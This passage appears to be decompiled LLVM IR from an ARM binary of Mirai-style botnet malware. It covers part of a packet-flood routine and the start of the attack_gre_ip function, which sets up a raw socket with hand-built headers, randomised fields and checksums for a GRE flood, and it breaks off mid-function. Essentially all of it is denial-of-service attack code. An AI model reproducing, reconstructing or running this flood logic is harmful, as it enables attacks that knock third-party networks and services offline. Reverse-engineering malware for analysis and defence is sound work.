dec_label_pc_8e10:                                ; preds = %bb88, %.thread11, %dec_label_pc_8ff0
  %v0_8e10 = call i32 @rand_next()
  store i32 %v0_8e10, i32* %r0.global-to-local, align 4
  store i32 %v0_8e10, i32* %stack_var_-48, align 4
  %v0_8e18 = call i32 @rand_next()
  store i32 %v0_8e18, i32* %r0.global-to-local, align 4
  store i32 %v0_8e18, i32* %stack_var_-52, align 4
  %v0_8e20 = call i32 @rand_next()
  store i32 %v2_8e24, i32* %r1.global-to-local, align 4
  store i32 %v0_8e20, i32* %stack_var_-56, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_8e30 = load i32, i32* @r7, align 4
  store i32 %v0_8e30, i32* %r0.global-to-local, align 4
  %v3_8e34 = call i32 @util_memcpy(i32 %v0_8e30, i32 %v2_8e24, i32 4)
  %v0_8e38 = load i32, i32* @r7, align 4
  %v1_8e38 = add i32 %v0_8e38, 6
  store i32 %v1_8e38, i32* %r0.global-to-local, align 4
  store i32 %v2_8e3c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_8e44 = call i32 @util_memcpy(i32 %v1_8e38, i32 %v2_8e3c, i32 4)
  %v0_8e48 = load i32, i32* @r7, align 4
  %v1_8e48 = add i32 %v0_8e48, 4
  store i32 %v1_8e48, i32* %r0.global-to-local, align 4
  store i32 %v2_8e4c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_8e54 = call i32 @util_memcpy(i32 %v1_8e48, i32 %v2_8e4c, i32 2)
  store i32 %v2_8e58, i32* %r1.global-to-local, align 4
  %v0_8e5c = load i32, i32* @r7, align 4
  %v1_8e5c = add i32 %v0_8e5c, 10
  store i32 %v1_8e5c, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_8e64 = call i32 @util_memcpy(i32 %v1_8e5c, i32 %v2_8e58, i32 2)
  store i32 %v3_8e64, i32* %r0.global-to-local, align 4
  store i32 %v1_8ab4, i32* %r1.global-to-local, align 4
  store i1 %v2_8e6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8e6c, label %dec_label_pc_8e74, label %dec_label_pc_8ffc

dec_label_pc_8e74:                                ; preds = %dec_label_pc_8e10, %dec_label_pc_8ffc
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_8e78 = load i32, i32* @r5, align 4
  %v3_8e78 = add i32 %v2_8e78, 10
  %v4_8e78 = inttoptr i32 %v3_8e78 to i16*
  store i16 0, i16* %v4_8e78, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_8e80 = load i32, i32* @r5, align 4
  store i32 %v0_8e80, i32* @r0, align 4
  %v2_8e84 = call i32 @checksum_generic(i32 %v0_8e80, i32 20)
  %v3_8e84 = trunc i32 %v2_8e84 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_8e8c = load i32, i32* @r5, align 4
  %v4_8e8c = add i32 %v3_8e8c, 10
  %v5_8e8c = inttoptr i32 %v4_8e8c to i16*
  store i16 %v3_8e84, i16* %v5_8e8c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_8e94 = load i32, i32* %r3.global-to-local, align 4
  %v1_8e94 = trunc i32 %v0_8e94 to i16
  %v2_8e94 = load i32, i32* @r6, align 4
  %v3_8e94 = add i32 %v2_8e94, 10
  %v4_8e94 = inttoptr i32 %v3_8e94 to i16*
  store i16 %v1_8e94, i16* %v4_8e94, align 2
  %v0_8e98 = load i32, i32* @r6, align 4
  store i32 %v0_8e98, i32* @r0, align 4
  %v2_8e9c = call i32 @checksum_generic(i32 %v0_8e98, i32 20)
  %v3_8e9c = trunc i32 %v2_8e9c to i16
  store i32 %v2_8e9c, i32* %r0.global-to-local, align 4
  %v3_8ea0 = load i32, i32* @r6, align 4
  %v4_8ea0 = add i32 %v3_8ea0, 10
  %v5_8ea0 = inttoptr i32 %v4_8ea0 to i16*
  store i16 %v3_8e9c, i16* %v5_8ea0, align 2
  store i32 0, i32* @r4, align 4
  %v0_8ea8 = load i32, i32* @r8, align 4
  store i32 %v0_8ea8, i32* @r1, align 4
  %v1_8eac = add i32 %v0_8ea8, 4
  %v2_8eac = inttoptr i32 %v1_8eac to i16*
  %v3_8eac = load i16, i16* %v2_8eac, align 2
  %v4_8eac = zext i16 %v3_8eac to i32
  store i32 %v4_8eac, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-136.0.ph, i32* %r3.global-to-local, align 4
  %v3_8eb4 = add i32 %v0_8ea8, 6
  %v4_8eb4 = inttoptr i32 %v3_8eb4 to i16*
  store i16 0, i16* %v4_8eb4, align 2
  %v0_8eb8 = load i32, i32* @r6, align 4
  store i32 %v0_8eb8, i32* %r0.global-to-local, align 4
  %v4_8ebc = call i32 @checksum_tcpudp(i32 %v0_8eb8, i32 %v0_8ea8, i32 %v4_8eac, i32 %stack_var_-136.0.ph)
  %v5_8ebc = trunc i32 %v4_8ebc to i16
  store i32 %v4_8ebc, i32* %r0.global-to-local, align 4
  %v3_8ec0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8ec0, i32* %r2.global-to-local, align 4
  %v3_8ec4 = mul i32 %v3_8ec0, 32
  store i32 %v3_8ec4, i32* %r3.global-to-local, align 4
  %v0_8ec8 = load i32, i32* @r5, align 4
  %v1_8ec8 = add i32 %v0_8ec8, 16
  %v2_8ec8 = inttoptr i32 %v1_8ec8 to i32*
  %v3_8ec8 = load i32, i32* %v2_8ec8, align 4
  %v5_8ecc = mul i32 %v3_8ec0, 24
  store i32 %v5_8ecc, i32* %r3.global-to-local, align 4
  %v1_8ed0 = load i32, i32* @sb, align 4
  %v2_8ed0 = add i32 %v1_8ed0, %v5_8ecc
  store i32 %v2_8ed0, i32* @lr, align 4
  %v2_8ed4 = add i32 %v2_8ed0, 4
  %v3_8ed4 = inttoptr i32 %v2_8ed4 to i32*
  store i32 %v3_8ec8, i32* %v3_8ed4, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_8edc = load i32, i32* @r8, align 4
  %v4_8edc = add i32 %v3_8edc, 6
  %v5_8edc = inttoptr i32 %v4_8edc to i16*
  store i16 %v5_8ebc, i16* %v5_8edc, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_8ee4 = load i32, i32* %r1.global-to-local, align 4
  %v1_8ee4 = trunc i32 %v0_8ee4 to i16
  %v2_8ee4 = load i32, i32* %r3.global-to-local, align 4
  %v3_8ee4 = load i32, i32* @sb, align 4
  %v4_8ee4 = add i32 %v3_8ee4, %v2_8ee4
  %v5_8ee4 = inttoptr i32 %v4_8ee4 to i16*
  store i16 %v1_8ee4, i16* %v5_8ee4, align 2
  %v0_8ee8 = load i32, i32* @r4, align 4
  %v1_8ee8 = trunc i32 %v0_8ee8 to i16
  %v2_8ee8 = load i32, i32* @lr, align 4
  %v3_8ee8 = add i32 %v2_8ee8, 2
  %v4_8ee8 = inttoptr i32 %v3_8ee8 to i16*
  store i16 %v1_8ee8, i16* %v4_8ee8, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_8ef0 = load i32, i32* @r5, align 4
  store i32 %v0_8ef0, i32* %r1.global-to-local, align 4
  store i32 %v3_8afc, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-132.0.ph, i32* %r2.global-to-local, align 4
  %v0_8efc = load i32, i32* @lr, align 4
  %v0_8f00 = load i32, i32* %ip.global-to-local, align 4
  %v6_8f04 = call i32 @__libc_sendto(i32 %v3_8afc, i32 %v0_8ef0, i32 %stack_var_-132.0.ph, i32 16384, i32 %v0_8efc, i32 %v0_8f00)
  %v3_8f08 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8f08, i32* %r3.global-to-local, align 4
  %v1_8f0c = add i32 %v3_8f08, 1
  store i32 %v1_8f0c, i32* %r0.global-to-local, align 4
  %v1_8f10 = load i32, i32* @sl, align 4
  %v9_8f10 = icmp eq i32 %v1_8f0c, %v1_8f10
  store i1 %v9_8f10, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8f0c, i32* %stack_var_-44, align 4
  %v6_8f18 = icmp slt i32 %v1_8f0c, %v1_8f10
  br i1 %v6_8f18, label %dec_label_pc_8d9c, label %dec_label_pc_8d88

dec_label_pc_8f20:                                ; preds = %dec_label_pc_8d9c
  %v1_8f20 = add i32 %v2_8da4, 16
  %v2_8f20 = inttoptr i32 %v1_8f20 to i32*
  %v3_8f20 = load i32, i32* %v2_8f20, align 4
  store i32 %v3_8f20, i32* %r4.global-to-local, align 4
  %v0_8f24 = call i32 @rand_next()
  store i32 %v0_8f24, i32* %r0.global-to-local, align 4
  %v3_8f28 = load i32, i32* %stack_var_-44, align 4
  %v5_8f30 = mul i32 %v3_8f28, 24
  %v0_8f34 = load i32, i32* %r4.global-to-local, align 4
  %v1_8f34 = and i32 %v0_8f34, 16711680
  store i32 %v1_8f34, i32* %ip.global-to-local, align 4
  %v3_8f38 = udiv i32 %v0_8f34, 16777216
  %v4_8f3c = udiv i32 %v1_8f34, 256
  %v5_8f3c = or i32 %v4_8f3c, %v3_8f38
  store i32 %v5_8f3c, i32* %r2.global-to-local, align 4
  %v1_8f40 = load i32, i32* @sb, align 4
  %v2_8f40 = add i32 %v1_8f40, %v5_8f30
  store i32 %v2_8f40, i32* %r1.global-to-local, align 4
  %v1_8f44 = and i32 %v0_8f34, 65280
  store i32 %v1_8f44, i32* %r3.global-to-local, align 4
  %v1_8f48 = add i32 %v2_8f40, 20
  %v2_8f48 = inttoptr i32 %v1_8f48 to i8*
  %v3_8f48 = load i8, i8* %v2_8f48, align 1
  %v4_8f48 = zext i8 %v3_8f48 to i32
  store i32 %v4_8f48, i32* %ip.global-to-local, align 4
  %v5_8f50 = call i32 @llvm.bswap.i32(i32 %v0_8f34)
  %v7_8f54 = lshr i32 %v0_8f24, %v4_8f48
  %v8_8f54 = add i32 %v7_8f54, %v5_8f50
  store i32 %v8_8f54, i32* %r2.global-to-local, align 4
  %v1_8f58 = and i32 %v8_8f54, 16711680
  store i32 %v1_8f58, i32* %r0.global-to-local, align 4
  store i32 %v6_8ae8, i32* %r1.global-to-local, align 4
  %v5_8f70 = call i32 @llvm.bswap.i32(i32 %v8_8f54)
  store i32 %v5_8f70, i32* %r3.global-to-local, align 4
  store i1 %v7_8dcc, i1* %cpsr_z.global-to-local, align 1
  %v1_8f78 = load i32, i32* @r5, align 4
  %v2_8f78 = add i32 %v1_8f78, 16
  %v3_8f78 = inttoptr i32 %v2_8f78 to i32*
  store i32 %v5_8f70, i32* %v3_8f78, align 4
  br i1 %v2_8dcc, label %dec_label_pc_8f80, label %dec_label_pc_8dd4

dec_label_pc_8f80:                                ; preds = %dec_label_pc_8f20, %dec_label_pc_8dc8
  %v0_8f80 = call i32 @rand_next()
  store i32 %v0_8f80, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_8f8c = load i32, i32* @fp, align 4
  %v9_8f8c = icmp eq i32 %v0_8f8c, 65535
  store i1 %v9_8f8c, i1* %cpsr_z.global-to-local, align 1
  %v1_8f90 = load i32, i32* @r5, align 4
  %v2_8f90 = add i32 %v1_8f90, 12
  %v3_8f90 = inttoptr i32 %v2_8f90 to i32*
  store i32 %v0_8f80, i32* %v3_8f90, align 4
  br i1 %v9_8f8c, label %dec_label_pc_8f98, label %dec_label_pc_8f80.dec_label_pc_8de4_crit_edge

dec_label_pc_8f80.dec_label_pc_8de4_crit_edge:    ; preds = %dec_label_pc_8f80
  %v1_8de8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_8de4

dec_label_pc_8f98:                                ; preds = %dec_label_pc_8f80, %dec_label_pc_8dd4
  %v0_8f98 = call i32 @rand_next()
  %v3_8fa0 = urem i32 %v0_8f98, 65536
  store i32 %v3_8fa0, i32* %r0.global-to-local, align 4
  store i32 %v3_8b48, i32* %r2.global-to-local, align 4
  %v1_8fac = sub nsw i32 999, %v3_8fa0
  store i32 %v1_8fac, i32* %r3.global-to-local, align 4
  %v1_8fb0 = load i32, i32* %r4.global-to-local, align 4
  %v9_8fb0 = icmp eq i32 %v3_8b48, %v1_8fb0
  store i1 %v9_8fb0, i1* %cpsr_z.global-to-local, align 1
  %v1_8fb4 = trunc i32 %v0_8f98 to i16
  %v2_8fb4 = load i32, i32* @r5, align 4
  %v3_8fb4 = add i32 %v2_8fb4, 4
  %v4_8fb4 = inttoptr i32 %v3_8fb4 to i16*
  store i16 %v1_8fb4, i16* %v4_8fb4, align 2
  %v0_8fb8 = load i32, i32* %r3.global-to-local, align 4
  %v1_8fb8 = trunc i32 %v0_8fb8 to i16
  %v2_8fb8 = load i32, i32* @r6, align 4
  %v3_8fb8 = add i32 %v2_8fb8, 4
  %v4_8fb8 = inttoptr i32 %v3_8fb8 to i16*
  store i16 %v1_8fb8, i16* %v4_8fb8, align 2
  br i1 %v9_8fb0, label %dec_label_pc_8fc0, label %dec_label_pc_8f98.dec_label_pc_8df0_crit_edge

dec_label_pc_8f98.dec_label_pc_8df0_crit_edge:    ; preds = %dec_label_pc_8f98
  %v1_8df4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_8df0

dec_label_pc_8fc0:                                ; preds = %dec_label_pc_8f98, %dec_label_pc_8de4
  %v0_8fc0 = call i32 @rand_next()
  %v1_8fc0 = trunc i32 %v0_8fc0 to i16
  store i32 %v0_8fc0, i32* %r0.global-to-local, align 4
  store i32 %v3_8b4c, i32* %r3.global-to-local, align 4
  %v1_8fc8 = load i32, i32* %r4.global-to-local, align 4
  %v9_8fc8 = icmp eq i32 %v3_8b4c, %v1_8fc8
  store i1 %v9_8fc8, i1* %cpsr_z.global-to-local, align 1
  %v3_8fcc = load i32, i32* @r5, align 4
  %v4_8fcc = add i32 %v3_8fcc, 58
  %v5_8fcc = inttoptr i32 %v4_8fcc to i16*
  store i16 %v1_8fc0, i16* %v5_8fcc, align 2
  br i1 %v9_8fc8, label %dec_label_pc_8fd4, label %dec_label_pc_8dfc

dec_label_pc_8fd4:                                ; preds = %dec_label_pc_8fc0, %dec_label_pc_8df0
  %v0_8fd4 = call i32 @rand_next()
  %v1_8fd4 = trunc i32 %v0_8fd4 to i16
  store i32 %v0_8fd4, i32* %r0.global-to-local, align 4
  store i32 %v1_8b40, i32* @r4, align 4
  store i1 %v2_8fdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8fdc, label %.thread31, label %bb88

.thread31:                                        ; preds = %dec_label_pc_8fd4
  %v3_8fe432 = load i32, i32* @r8, align 4
  %v4_8fe433 = add i32 %v3_8fe432, 2
  %v5_8fe434 = inttoptr i32 %v4_8fe433 to i16*
  store i16 %v1_8fd4, i16* %v5_8fe434, align 2
  br label %dec_label_pc_8ff0

bb88:                                             ; preds = %dec_label_pc_8fd4
  %v1_8fe0 = load i32, i32* @r5, align 4
  %v2_8fe0 = add i32 %v1_8fe0, 16
  %v3_8fe0 = inttoptr i32 %v2_8fe0 to i32*
  %v4_8fe0 = load i32, i32* %v3_8fe0, align 4
  store i32 %v4_8fe0, i32* %r3.global-to-local, align 4
  %v3_8fe4 = load i32, i32* @r8, align 4
  %v4_8fe4 = add i32 %v3_8fe4, 2
  %v5_8fe4 = inttoptr i32 %v4_8fe4 to i16*
  store i16 %v1_8fd4, i16* %v5_8fe4, align 2
  %v1_8fe8 = load i32, i32* %r3.global-to-local, align 4
  %v2_8fe8 = load i32, i32* @r6, align 4
  %v3_8fe8 = add i32 %v2_8fe8, 16
  %v4_8fe8 = inttoptr i32 %v3_8fe8 to i32*
  store i32 %v1_8fe8, i32* %v4_8fe8, align 4
  br label %dec_label_pc_8e10

dec_label_pc_8ff0:                                ; preds = %.thread31, %dec_label_pc_8dfc
  %v0_8ff0 = call i32 @rand_next()
  store i32 %v0_8ff0, i32* %r0.global-to-local, align 4
  %v1_8ff4 = load i32, i32* @r6, align 4
  %v2_8ff4 = add i32 %v1_8ff4, 16
  %v3_8ff4 = inttoptr i32 %v2_8ff4 to i32*
  store i32 %v0_8ff0, i32* %v3_8ff4, align 4
  br label %dec_label_pc_8e10

dec_label_pc_8ffc:                                ; preds = %dec_label_pc_8e10
  %v0_8ffc = load i32, i32* @r8, align 4
  %v1_8ffc = add i32 %v0_8ffc, 8
  store i32 %v1_8ffc, i32* %r0.global-to-local, align 4
  store i32 %v6_8a94, i32* %r1.global-to-local, align 4
  %v2_9004 = inttoptr i32 %v1_8ffc to i16*
  %v3_9004 = call i32 @rand_str(i16* %v2_9004, i32 %v6_8a94)
  store i32 %v3_9004, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8e74

dec_label_pc_900c:                                ; preds = %dec_label_pc_8b0c
  store i32 %v3_8afc, i32* %r0.global-to-local, align 4
  %v1_9010 = call i32 @__GI___libc_close(i32 %v3_8afc)
  store i32 %v1_9010, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9014

dec_label_pc_9014:                                ; preds = %entry, %dec_label_pc_900c
  %v1_901c = phi i32 [ %v3_8afc, %entry ], [ %v1_9010, %dec_label_pc_900c ]
  store i32 %v3_89ac, i32* %r4.global-to-local, align 4
  store i32 %v6_89ac, i32* %r5.global-to-local, align 4
  store i32 %v24_89ac, i32* %fp.global-to-local, align 4
  ret i32 %v1_901c

dec_label_pc_9020:                                ; preds = %dec_label_pc_8b34
  %v1_9028 = add i32 %v6_8a94, 8
  store i32 %v1_9028, i32* %r1.global-to-local, align 4
  %v1_902c = add i32 %v6_8a94, 66
  store i32 %v1_902c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_8d88.preheader

; uselistorder directives
  uselistorder i32 %v1_902c, { 1, 0 }
  uselistorder i32 %v1_9028, { 1, 0 }
  uselistorder i16 %v1_8fd4, { 1, 0 }
  uselistorder i32 %v0_8fd4, { 1, 0 }
  uselistorder i32 %v0_8fc0, { 1, 0 }
  uselistorder i32 %v3_8fa0, { 1, 0 }
  uselistorder i32 %v0_8f98, { 1, 0 }
  uselistorder i32 %v5_8f70, { 1, 0 }
  uselistorder i32 %v0_8f34, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8f10, { 1, 2, 0 }
  uselistorder i32 %v1_8f0c, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_8ec0, { 1, 0, 2 }
  uselistorder i32 %v4_8ebc, { 1, 0 }
  uselistorder i32 %v0_8ea8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8e9c, { 1, 0 }
  uselistorder i32 %v7_8db0, { 2, 1, 0, 3 }
  uselistorder i1 %v7_8dcc, { 2, 1, 0 }
  uselistorder i1 %v2_8fdc, { 2, 3, 1, 0 }
  uselistorder i32 %v0_8d20, { 1, 0, 2 }
  uselistorder i32 %v3_8b9c, { 1, 0 }
  uselistorder i32 %v3_8b80, { 1, 2, 0 }
  uselistorder i32 %v1_8b7c, { 1, 0 }
  uselistorder i32 %v1_8b40, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_8b3c, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8b38, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8b34, { 1, 0, 2, 3 }
  uselistorder i1 %v7_8b2c, { 1, 0 }
  uselistorder i1 %v7_8b00, { 1, 0 }
  uselistorder i32 %v3_8afc, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v6_8ae8, { 5, 3, 0, 4, 1, 2 }
  uselistorder i32 %v1_8ab4, { 1, 2, 3, 0 }
  uselistorder i32 %v6_8a94, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8a48, { 1, 2, 0 }
  uselistorder i32 %v1_8a24, { 3, 2, 1, 0 }
  uselistorder i32 %v6_8a1c, { 1, 0 }
  uselistorder i32 %v6_89e0, { 2, 1, 3, 0 }
  uselistorder i32 %v2_89c8, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r4.global-to-local, { 0, 6, 5, 7, 1, 2, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 1, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 27, 26, 28, 29, 31, 30, 32, 33, 35, 34, 37, 36, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 8, 6, 10, 9, 12, 11, 13, 15, 14, 16, 18, 17, 19, 20, 21, 22, 24, 23, 27, 25, 26, 30, 28, 29, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9014, { 1, 0 }
  uselistorder label %dec_label_pc_8e74, { 1, 0 }
  uselistorder label %dec_label_pc_8e10, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8d88, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8d88.preheader, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %.thread25, { 1, 0 }
}

define i32 @attack_gre_ip(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_9040 = load i32, i32* @r4, align 4
  %v6_9040 = load i32, i32* @r5, align 4
  %v24_9040 = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_905c = call i32 @calloc(i32 %arg1, i32 4)
  %v0_9060 = load i32, i32* @r5, align 4
  store i32 %v0_9060, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9070 = load i32, i32* @r4, align 4
  %v5_9074 = inttoptr i32 %v0_9060 to i32*
  %v6_9074 = call i32 @attack_get_opt_int(i32 %v0_9070, i32* %v5_9074, i32 2, i32 0, i32 %v2_905c)
  %v1_9080 = urem i32 %v6_9074, 256
  store i32 %v1_9080, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_908c = load i32, i32* @r5, align 4
  store i32 %v0_908c, i32* %r1.global-to-local, align 4
  %v0_9090 = load i32, i32* @r4, align 4
  %v5_9094 = trunc i32 %v6_9074 to i8
  %v6_9098 = inttoptr i32 %v0_908c to i32*
  %v7_9098 = call i32 @attack_get_opt_int(i32 %v0_9090, i32* %v6_9098, i32 3, i32 65535, i32 %v6_9074)
  %v0_909c = load i32, i32* @r5, align 4
  store i32 %v0_909c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_9098, i32* %fp.global-to-local, align 4
  %v0_90ac = load i32, i32* @r4, align 4
  %v5_90b0 = inttoptr i32 %v0_909c to i32*
  %v6_90b0 = call i32 @attack_get_opt_int(i32 %v0_90ac, i32* %v5_90b0, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_90b8 = urem i32 %v6_90b0, 256
  store i32 %v1_90b8, i32* %ip.global-to-local, align 4
  %v0_90bc = load i32, i32* @r5, align 4
  store i32 %v0_90bc, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_90c8 = load i32, i32* @r4, align 4
  %v6_90d0 = inttoptr i32 %v0_90bc to i32*
  %v7_90d0 = call i32 @attack_get_opt_int(i32 %v0_90c8, i32* %v6_90d0, i32 5, i32 1, i32 %v1_90b8)
  %v1_90dc = urem i32 %v7_90d0, 256
  store i32 %v1_90dc, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_90e8 = load i32, i32* @r5, align 4
  store i32 %v0_90e8, i32* %r1.global-to-local, align 4
  %v0_90ec = load i32, i32* @r4, align 4
  %v5_90f4 = inttoptr i32 %v0_90e8 to i32*
  %v6_90f4 = call i32 @attack_get_opt_int(i32 %v0_90ec, i32* %v5_90f4, i32 6, i32 65535, i32 %v1_90dc)
  %v0_90fc = load i32, i32* @r5, align 4
  store i32 %v0_90fc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_90f4, i32* @r8, align 4
  %v0_910c = load i32, i32* @r4, align 4
  %v5_9110 = inttoptr i32 %v0_90fc to i32*
  %v6_9110 = call i32 @attack_get_opt_int(i32 %v0_910c, i32* %v5_9110, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_9114 = load i32, i32* @r5, align 4
  store i32 %v0_9114, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_9110, i32* @r7, align 4
  %v0_9124 = load i32, i32* @r4, align 4
  %v5_9128 = inttoptr i32 %v0_9114 to i32*
  %v6_9128 = call i32 @attack_get_opt_int(i32 %v0_9124, i32* %v5_9128, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9138 = load i32, i32* @r5, align 4
  store i32 %v0_9138, i32* %r1.global-to-local, align 4
  %v0_913c = load i32, i32* @r4, align 4
  %v5_9140 = inttoptr i32 %v0_9138 to i32*
  %v6_9140 = call i32 @attack_get_opt_int(i32 %v0_913c, i32* %v5_9140, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_9148 = urem i32 %v6_9140, 256
  store i32 %v1_9148, i32* %ip.global-to-local, align 4
  %v0_914c = load i32, i32* @r5, align 4
  store i32 %v0_914c, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9158 = load i32, i32* @r4, align 4
  %v5_9160 = inttoptr i32 %v0_914c to i32*
  %v6_9160 = call i32 @attack_get_opt_int(i32 %v0_9158, i32* %v5_9160, i32 19, i32 0, i32 %v1_9148)
  %v0_9168 = load i32, i32* @r5, align 4
  store i32 %v0_9168, i32* %r1.global-to-local, align 4
  %v2_916c = load i32, i32* @global_var_2472c.58, align 4
  store i32 %v2_916c, i32* %r3.global-to-local, align 4
  store i32 %v6_9160, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_9178 = load i32, i32* @r4, align 4
  %v5_917c = inttoptr i32 %v0_9168 to i32*
  %v6_917c = call i32 @attack_get_opt_int(i32 %v0_9178, i32* %v5_917c, i32 25, i32 %v2_916c, i32 ptrtoint (i32* @0 to i32))
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_9190 = call i32 @socket(i32 2, i32 3, i32 6)
  %v7_9194 = icmp eq i32 %v3_9190, -1
  store i1 %v7_9194, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9194, label %dec_label_pc_9634, label %dec_label_pc_91a0

dec_label_pc_91a0:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_91a8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_91a8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_91bc = call i32 @__GI_setsockopt(i32 %v3_9190, i32 0, i32 3, i32 %v6_91a8, i32 4)
  %v7_91c0 = icmp eq i32 %v5_91bc, -1
  store i1 %v7_91c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_91c0, label %dec_label_pc_962c, label %dec_label_pc_91c8

dec_label_pc_91c8:                                ; preds = %dec_label_pc_91a0
  %v0_91c8 = load i32, i32* @r8, align 4
  %v0_91cc = load i32, i32* @r7, align 4
  %v0_91d0 = load i32, i32* %fp.global-to-local, align 4
  %v0_91d4 = load i32, i32* @r6, align 4
  %v1_91d4 = urem i32 %v0_91d4, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_91dc = urem i32 %v0_91c8, 65536
  store i32 %v3_91dc, i32* %r3.global-to-local, align 4
  %v3_91e0 = urem i32 %v0_91cc, 65536
